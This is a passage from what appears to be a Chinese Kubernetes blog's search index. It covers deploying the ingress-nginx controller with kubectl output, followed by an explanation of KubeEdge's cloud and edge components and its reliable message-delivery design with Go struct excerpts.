ingressesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingresses/statusverbs:- update- apiGroups:- networking.k8s.io # k8s 1.14+resources:- ingressclassesverbs:- get- list- watch- apiGroups:- ''resources:- configmapsresourceNames:- ingress-controller-leader-nginxverbs:- get- update- apiGroups:- ''resources:- configmapsverbs:- create- apiGroups:- ''resources:- eventsverbs:- create- patch---# Source: ingress-nginx/templates/controller-rolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:RoleBindingmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxroleRef:apiGroup:rbac.authorization.k8s.iokind:Rolename:ingress-nginxsubjec","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:5:2","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"demo-example (base) [root@node1 ingress]# kubectl create -f test-deploy.yaml namespace/ingress-nginx created serviceaccount/ingress-nginx created configmap/ingress-nginx-controller created clusterrole.rbac.authorization.k8s.io/ingress-nginx created clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx created role.rbac.authorization.k8s.io/ingress-nginx created rolebinding.rbac.authorization.k8s.io/ingress-nginx created service/ingress-nginx-controller-admission created service/ingress-nginx-controller created deployment.apps/ingress-nginx-controller created validatingwebhookconfiguration.admissionregistration.k8s.io/ingress-nginx-admission created serviceaccount/ingress-nginx-admission created clusterrole.rbac.authorization.k8s.io/ingress-nginx-admission created clusterrolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created role.rbac.authorization.k8s.io/ingress-nginx-admission created rolebinding.rbac.authorization.k8s.io/ingress-nginx-admission created job.batch/ingress-nginx-admission-create created job.batch/ingress-nginx-admission-patch created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ~]# kubectl get svc -n ingress-nginx NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE ingress-nginx-controller NodePort 10.233.11.136 \u003cnone\u003e 80:31346/TCP,443:31929/TCP 68s ingress-nginx-controller-admission ClusterIP 10.233.45.168 \u003cnone\u003e 443/TCP 68s (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl create -f app.yaml deployment.apps/ivision created service/ivision-svc created deployment.apps/iresource created service/iresource-svc created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl create -f example-ingress.yaml ingress.extensions/example-ingress created (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ~]# kubectl get ingress -A NAMESPACE NAME HOSTS ADDRESS PORTS AGE default example-ingress hello-world.com 10.7.11.212 80 100s (base) [root@node1 ~]# (base) [root@node1 ~]# (base) [root@node1 ~]# kubectl describe ingress example-ingress Name: example-ingress Namespace: default Address: 10.7.11.212 Default backend: default-http-backend:80 (\u003cnone\u003e) Rules: Host Path Backends ---- ---- -------- hello-world.com /vision ivision-svc:8080 (10.233.90.45:8080,10.233.90.49:8080) Annotations: nginx.ingress.kubernetes.io/rewrite-target: /$1 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Sync 98s (x2 over 2m3s) nginx-ingress-controller Scheduled for sync (base) [root@node1 ~]# (base) [root@node1 ingress]# kubectl get svc -A NAMESPACE NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE default iresource-svc ClusterIP 10.233.55.49 \u003cnone\u003e 8080/TCP 30m default ivision-svc ClusterIP 10.233.34.49 \u003cnone\u003e 8080/TCP 30m default kubernetes ClusterIP 10.233.0.1 \u003cnone\u003e 443/TCP 259d ingress-nginx ingress-nginx-controller NodePort 10.233.11.136 \u003cnone\u003e 80:31346/TCP,443:31929/TCP 3h2m ingress-nginx ingress-nginx-controller-admission ClusterIP 10.233.45.168 \u003cnone\u003e 443/TCP 3h2m TCP 182d (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# curl http://hello-world.com:31346/vision Hello, world!Version: 1.0.0 Hostname: ivision-7859ffbc88-569pl For hello-world.com:31346 / HELLO_MY_HELLO_WORLD_PORT_8090_TCP: tcp://10.233.21.171:8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_ADDR: 10.233.21.171 HELLO_MY_HELLO_WORLD_SERVICE_PORT: 8090 HELLO_MY_HELLO_WORLD_PORT: tcp://10.233.21.171:8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_PORT: 8090 HELLO_MY_HELLO_WORLD_SERVICE_HOST: 10.233.21.171 HELLO_MY_HELLO_WORLD_SERVICE_PORT_HTTP: 8090 HELLO_MY_HELLO_WORLD_PORT_8090_TCP_PROTO: tcp (base) [root@node1 ingress]# (base) [root@node1 ingress]# (base) [root@node1 ingress]# kubectl delete -f test-deploy.yaml namespace \"ingress-nginx\" deleted serviceaccount \"ingress-nginx\" deleted configmap \"ingress-nginx-controller\" deleted clus","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:5:3","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"参考资料 Ingress说明 NGINX Ingress Controller How kubernetes/ingress-nginx works 原理介绍 Ingress通过互联网访问应用 Ingress-nginx介绍及演示 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:6:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"KubeEdge架构和组件介绍 KubeEdge提供了一个容器化的边缘计算平台，该平台具有内在的可伸缩性。由于模块化和优化的设计，它是轻量级的(较小的占用空间和运行内存)，可以部署在低资源的设备上。同样，边缘节点可以具有不同的硬件结构和不同的硬件配置。对于设备连接，它可以支持多个协议，并使用标准的基于MQTT的通信.这有助于有效地扩展具有新节点和设备的边缘集群。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:0:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"介绍 KubeEdge是一个开源系统，用于将本机容器化的应用程序编排功能扩展到Edge上的主机， 它基于kubernetes构建，并为网络，应用程序提供基本的基础架构支持。云和边缘之间的部署和元数据同步。 Kubeedge已获得Apache 2.0的许可。并且完全免费供个人或商业使用。我们欢迎贡献者！ 我们的目标是建立一个开放平台，以支持Edge计算，将原生容器化应用程序编排功能扩展到Edge上的主机，该主机基于kubernetes，并为网络， 应用程序部署以及云与Edge之间的元数据同步提供基础架构支持。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:1:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"特点 完全开放 - Edge Core和Cloud Core都是开源的。 离线模式 - 即使与云断开连接，Edge也可以运行。 基于Kubernetes - 节点，群集，应用程序和设备管理。 可扩展 - 容器化，微服务 资源优化 - 可以在资源不足的情况下运行。边缘云上资源的优化利用。 跨平台 - 无感知；可以在私有，公共和混合云中工作。 数据与分析 - 支持数据管理，数据分析管道引擎。 异构 - 可以支持x86，ARM。 简化开发 - 基于SDK的设备加成，应用程序部署等开发 易于维护 - 升级，回滚，监视，警报等 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:2:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"优势 边缘计算： 通过在Edge上运行的业务逻辑，可以在生成数据的本地保护和处理大量数据。这减少了网络带宽需求以及边缘和云之间的消耗。这样可以提高响应速度，降低成本并保护客户的数据隐私。 简化开发：开发人员可以编写基于常规http或mqtt的应用程序，对其进行容器化，然后在Edge或Cloud中的任何位置运行它们中的更合适的一个。 Kubernetes原生支持： 借助KubeEdge，用户可以在Edge节点上编排应用，管理设备并监视应用和设备状态，就像云中的传统Kubernetes集群一样 大量的应用： 可以轻松地将现有的复杂机器学习，图像识别，事件处理和其他高级应用程序部署和部署到Edge。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:3:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"架构 kubeedge分为两个可执行程序，cloudcore和edgecore,分别有以下模块 cloudcore： CloudHub：云中的通信接口模块。一个Web套接字服务器，负责监视云端的更改、缓存和向EdgeHub发送消息 EdgeController：管理Edge节点。 一种扩展的Kubernetes控制器，它管理边缘节点和pod元数据，来定义边缘节点。 devicecontroller 负责设备管理。一种扩展的Kubernetes控制器，用于管理设备，以便设备元数据/状态数据可以在边缘和云之间同步。 edgecore： 主要有6个模块 Edged：在边缘节点上运行并管理容器化应用程序的代理。 EdgeHub：Edge上负责与云服务交互的Web套接字客户端。 负责与用于边缘计算(如KubeEdge体系结构中的EdgeController)云服务交互的Web套接字客户端，。这包括同步云端资源更新到边缘，以及报告边缘端主机和设备状态对云的更改。 EventBus：使用MQTT处理内部边缘通信。 MQTT客户端与MQTT服务器(MQTT服务器)交互，为其他组件提供发布和订阅功能。 DeviceTwin：负责存储设备状态和同步设备状态到云。它还为应用程序提供查询接口。。 MetaManager：edged和edgehub之间的消息处理器。它还负责将元数据存储/检索到轻量级数据库(SQLite)。 ServiceBus: 接收云上服务请求和边缘应用进行http交互 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:4:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Cloudcore ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:5:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"CloudHub CloudHub是cloudcore的一个模块，是Controller和Edge端之间的中介。它负责下行分发消息(其内封装了k8s资源事件，如pod update等)，也负责接收并发送边缘节点上行消息至controllers。其中下行的消息在应用层增强了传输的可靠性，以应对云边的弱网络环境。 到边缘的连接（通过EdgeHub模块）是通过可选的websocket/quic连接完成的。对于Cloudcore内部通信，Cloudhub直接与Controller通讯。Controller发送到CloudHub的所有请求，与用于存储这个边缘节点的事件对象的通道一起存储在channelq中。 Cloudhub内部主要有以下几个重要结构： MessageDispatcher：下行消息分发中心，也是下行消息队列的生产者，DispatchMessage函数中实现。 NodeMessageQueue：每个边缘节点有一个专属的消息队列，总体构成一个队列池，以Node + UID作为区分，ChannelMessageQueue结构体实现 WriteLoop：负责将消息写入底层连接，是上述消息队列的消费者 Connection server：接收边缘节点访问，支持websocket协议和quick协议连接 Http server：为边缘节点提供证书服务，如证书签发与证书轮转 云边消息格式的结构如下： Header，由beehive框架调用NewMessage函数提供，主要包括ID、ParentID、TimeStamp Body，包含消息源，消息Group，消息资源，资源对应的操作 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:5:1","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Edge Controller EdgeController是Kubernetes Api服务器和Edgecore之间的桥梁 DownstreamController UpstreamController ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:5:2","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Device Controller 通过k8s CRD来描述设备metadata/status ，devicecontroller在云和边缘之间同步，有两个goroutines: upstream controller/downstream controller device-crd-model # 关于kubeedge的crd# kubectl get CustomResourceDefinition -A |grep edgeclusterobjectsyncs.reliablesyncs.kubeedge.io 2021-05-25T02:35:25Zdevicemodels.devices.kubeedge.io 2021-05-25T02:33:32Zdevices.devices.kubeedge.io 2021-05-25T02:29:00Zobjectsyncs.reliablesyncs.kubeedge.io 2021-05-25T02:44:23Zruleendpoints.rules.kubeedge.io 2021-05-25T02:44:24Zrules.rules.kubeedge.io 2021-05-25T02:44:23Z# kubeedge device-model 和 device的crd# kubectl get CustomResourceDefinition -A |grep edge |grep devicedevicemodels.devices.kubeedge.io 2021-05-25T02:33:32Zdevices.devices.kubeedge.io 2021-05-25T02:29:00Z 云端下发更新边缘端设备 device-updates-cloud-edge 边缘端更新设备上报云端 device-updates-edge-cloud ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:5:3","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"EdgeCore EdgeCore支持amd以及arm，不能运行在有kubelet以及Kube-proxy的节点（或者关闭EdgeCore运行环境检查开关参数）。 EdgeCore包括几个模块：Edged、EdgeHub、MetaManager、DeviceTwin、EventBus、ServiceBus、EdgeStream以及EdgeMesh。 与k8s节点上部署的kubelet相比：对kubelet不必要的部分进行了精简，即edgecore中的edged；edgecore增加了与设备管理相关的模块如devicetwin以及eventbus；edgemesh模块实现了服务发现；edgecore将元数据进行本地存储，保证云边网络不稳定时边缘端也能正常工作，metamanager进行元数据的管理。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Edged Edged是管理节点生命周期的边缘节点模块。它可以帮助用户在边缘节点上部署容器化的工作负载或应用程序。 这些工作负载可以执行任何操作，从简单的遥测数据操作到分析或ML推理等。使用kubectl云端的命令行界面，用户可以发出命令来启动工作负载。 当前容器和镜像管理支持Docker容器运行时。将来应添加其他运行时支持，例如containerd等。 有许多模块协同工作以实现edged的功能。 pod管理: 用于pod的添加删除修改,它还使用pod status manager和pleg跟踪pod的运行状况。其主要工作如下： 从metamanager接收和处理pod添加/删除/修改消息。 处理单独的工作队列以添加和删除容器。 处理工作程序例程以检查工作程序队列以执行pod操作。 分别为config map 和 secrets保留单独的的缓存。 定期清理孤立的pod Pod生命周期事件生成器 CRI边缘化 secret管理 Probe Management ConfigMap Management Container GC Image GC Status Manager 卷管理 MetaClient ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:1","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"eventbus Eventbus充当用于发送/接收有关mqtt主题的消息的接口 modes 它支持三种模式： internalMqttMode externalMqttMode bothMqttMode topics - $hw/events/upload/# - SYS/dis/upload_records - SYS/dis/upload_records/+ - $hw/event/node/+/membership/get - $hw/event/node/+/membership/get/+ - $hw/events/device/+/state/update - $hw/events/device/+/state/update/+ - $hw/event/device/+/twin/+ messages flow eventbus sends messages from external client eventbus sends response messages to external client ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:2","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"MetaManager MetaManager是edged和edgehub之间的消息处理器。它还负责将元数据存储到轻量级数据库（SQLite）或从中检索元数据。 Metamanager根据以下列出的操作接收不同类型的消息： Insert Update Delete Query Response NodeConnection MetaSync Update Operation ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:3","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Edgehub Edge Hub负责与云中存在的CloudHub组件进行交互。它可以使用WebSocket连接或QUIC协议连接到CloudHub 。它支持同步云端资源更新，报告边缘端主机和设备状态更改等功能。 它充当边缘与云之间的通信链接。它将从云接收的消息转发到边缘的相应模块，反之亦然。 edgehub执行的主要功能是： Keep Alive Publish Client Info Route to Cloud Route to Edge EdgeHub中有两类client，分别是httpclient以及websocket/quic client，前者用于与EdgeCore与CloudCore通信所需证书的申请，后者负责与CloudCore的日常通信（资源下发、状态上传等） 当EdgeHub启动时，其先从CloudCore申请证书（若正确配置本地证书，则直接使用本地证书） 初始化与CloudCore通信的websocket/quic client，成功连接之后将成功连接的信息传给其他组件（MetaGroup、TwinGroup、BusGroup），分别启动三个goroutine不断的进行云到边以及边到云的消息分发(单纯分发，不做任何封装或改变)、健康状态上报。当云边传送消息过程中出现错误时，则边缘端重新init相应的websocket/quic client，与云端重新建立连接。 Route To Cloud Route To Edge ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:4","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"DeviceTwin DeviceTwin模块负责存储设备状态，处理设备属性，处理DeviceTwin操作，在边缘设备和边缘节点之间创建成员关系， 将设备状态同步到云以及在边缘和云之间同步DeviceTwin信息。它还为应用程序提供查询接口。 DeviceTwin由四个子模块（即membership，communication，device和device twin）组成，以执行device twin模块的职责。 Membership Module Twin Module Communication Module Device Module 数据存储方面，将设备数据存储到本地存储sqlLite，包括三张表：device、deviceAttr和deviceTwin。 处理其他模块发送到twin module的消息，然后调用 dtc.distributeMsg来处理消息。在消息处理逻辑里面，消息被分为了四个类别，并分别发送到这四个类别的action执行处理（每一个类别又包含多个action）： membership device communication twin ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:5","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"edgemesh 和kube-proxy的对比 kube-proxy： 需要list-watch service，从而进行服务发现 容器化部署在每个节点(daemonset) service with cluster IP edgemesh： 从cloudcore接收service信息，从而进行服务发现 嵌入到edgecore headless service ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:6:6","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"可靠的消息传递机制 云和边缘之间的不稳定网络会导致边缘节点频繁断开。如果Cloudcore或EdgeCore重新启动或脱机一段时间，这可能导致发送到边缘节点的消息丢失，这些消息无法临时到达。如果没有新事件成功地传递到边缘，这将导致云和边缘之间的不一致。 所以需要考虑设计一种云与边缘之间可靠的消息传递机制 有三种类型的消息传递机制： At-Most-Once Exactly-Once At-Least-Once At-Most-Once方式不可靠 第二种方法“Exactly-Once”非常昂贵，表现出最差的性能，尽管它提供了保证传递而不丢失或复制消息。由于KubeEdge遵循Kubernetes的最终一致性设计原则，因此只要消息是最新消息，边缘就不会反复接收相同的消息。 建议使用At-Least-Once ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:0","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"At-Least-Once Delivery 下面是一个使用MessageQueue和ACK确保消息从云传递到边缘的设计。 我们使用K8s CRD存储资源的最新版本，该资源已经成功地发送到EDGE。当Cloudcore正常重新启动或启动时，它将检查ResourceVersion以避免发送旧消息。 EdgeController和devicecontroller将消息发送到Cloudhub，MessageDispatcher将根据消息中的节点名称向相应的NodeMessageQueue发送消息。 CloudHub顺序地将数据从NodeMessageQueue发送到相应的边缘节点，并将消息ID存储在ACK信道中。当从边缘节点接收到ACK消息时，ACK通道将触发将消息资源版本保存到K8s作为CRD，并发送下一条消息。 当EdgeCore接收到消息时，它将首先将消息保存到本地数据存储，然后将ACK消息返回给云。 如果CloudHub在间隔内没有接收到ACK消息，它将继续重发该消息5次。如果所有5次重试都失败，CloudHub将放弃该事件。SyncController将处理这些失败事件。 即使边缘节点接收到消息，返回的ACK消息也可能在传输期间丢失。在这种情况下，CloudHub将再次发送消息，边缘可以处理重复的消息。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:1","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"SyncController SyncController将定期将保存的对象资源验证与K8s中的对象进行比较，然后触发重试和删除等事件。 当CloudHub向nodeMessageQueue添加事件时，它将与nodeMessageQueue中的相应对象进行比较。如果nodeMessageQueue中的对象较新，它将直接丢弃这些事件。 ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:2","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"Message Queue 当每个边缘节点成功连接到云时，将创建一个消息队列，该队列将缓存发送到边缘节点的所有消息。我们使用Kubernetes/Client-go中的workQueue和cacheStore来实现消息队列和对象存储。使用Kubernetes workQueue，将合并重复事件以提高传输效率。 // ChannelMessageQueue is the channel implementation of MessageQueue type ChannelMessageQueue struct { queuePool sync.Map storePool sync.Map listQueuePool sync.Map listStorePool sync.Map objectSyncLister reliablesyncslisters.ObjectSyncLister clusterObjectSyncLister reliablesyncslisters.ClusterObjectSyncLister } // Add message to the queue: key,_:=getMsgKey(\u0026message) nodeStore.Add(message) nodeQueue.Add(message) // Get the message from the queue: key,_:=nodeQueue.Get() msg,_,_:=nodeStore.GetByKey(key.(string)) // Structure of the message key: Key = resourceType/resourceNamespace/resourceName 说明，为了提高队列操作性能，队列中排列的是message key ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:3","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"ACK message Format AckMessage.ParentID = receivedMessage.ID AckMessage.Operation = \"response\" ","date":"2021-05-26","objectID":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/:7:4","tags":["K8S"],"title":"KubeEdge介绍和设计原理","uri":"/posts/2021/05/kubeedge%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AE%BE%E8%AE%A1%E5%8E%9F%E7%90%86/"},{"categories":["K8S"],"content":"ReliableSync CRD 我们使用K8s CRD保存已成功持久化到边缘的对象的资源验证。为了节省资源，我们设计了两种类型的CRD。 ClusterObjectSync 用于保存集群作用域对象， ObjectSync 用于保存命名空间作用域对象。 它们的名称由相关的节点名称和对象UUID组成。 // BuildObjectSyncName builds the name of objectSync/clusterObjectSync func BuildObjectSyncName(nodeName, UID string) string { return nodeName + \".\" + UID } The ClusterObjectSync type ClusterObjectSync struct { metav1.TypeMeta `json:\",inline\"` metav1.ObjectMeta `json:\"metadata,omitempty\"` Spec ClusterObjectSyncSpec `json:\"spec,omitempty\"` Status ClusterObjectSyncStatus `json:\"spec,omitempty\"` } // ClusterObjectSyncSpec stores the details of objects that sent to the edge. type ClusterObjectSyncSpec struct { // Required: ObjectGroupVerion is the group and version of the object // that was successfully sent to the edge node. ObjectGroupVerion string `json:\"objectGroupVerion,omitempty\"` // Required: ObjectKind is the type of the object // that was successfully sent to the edge node. ObjectKind string `json:\"objectKind,omitempty\"` // Required: ObjectName is the name of the object // that was successfully sent to the edge node. ObjectName string `json:\"objectName,omitempty\"` } // ClusterObjectSyncSpec stores the resourceversion of objects that sent to the edge. type ClusterObjectSyncStatus struct { // Required: ObjectResourceVersion is the resourceversion of the object // that was successfully sent to the edge node. ObjectResourceVersion string `json:\"objectResourceVersion,omitempty\"` } The ObjectSync type ClusterObjectSync struct { metav1.TypeMeta `json:\",inline\"` metav1.ObjectMeta `json:\"metadata,omitempty\"` Spec ObjectSyncSpec `json:\"spec,omitempty\"` Status ObjectSyncStatus `json:\"spec,omitempty\"` } // ObjectSyncSpec stores the details of objects that sent to the edge. type ObjectSyncSpec struct { // Required: ObjectGroupVerion is the group and version of the object // that was successfully sent to the edge node. ObjectGroupVerion string `json:\"objectGroupVerion,omitempty\"` // Required: ObjectKind is the type of the object // that was successfully sent to the edge node. ObjectKind string `json:\"objectKind,omitempty\"` // Required: ObjectName is the name of the object // that was successfully sent to the edge node. ObjectName string `json:\"objectName,omitempty\"` } // ClusterObjectSyncSpec stores the resourceversion of objects that sent to the edge. type ObjectSyncStatus struct { // Required: ObjectResourceVersion is the resourceversion of the object // that was successfully sent to the edge node. ObjectResourceVersion string `json:\"objectResourceVersion,omitempty\"` } ObjectSync CRD 示例 其中 ObjectSync crd实例name ： {nodename.UID} : node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 (base) [root@node1 ~]# kubectl get ObjectSync -A NAMESPACE NAME AGE default node2.252da63b-5b27-4cb5-9d36-0115657a9ffb 25h default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 127m default node2.bc5a3c5e-69dd-49c1-9753-194609229886 25h kube-system node2.538ed3e7-7cf1-417a-ad72-b69c152c6c00 25h kube-system node2.a0ce6db3-e247-436f-a72e-bdf5b2cc8fb9 25h (base) [root@node1 ~]# (base) [root@node1 ~]# (base) [root@node1 ~]# kubectl describe -n default node2.89c8bbd2-da6d-4bb4-bfb1-2faf68852009 error: the server doesn't have a resource type \"node2\" (base) [root@node1 ~]# kubectl describe 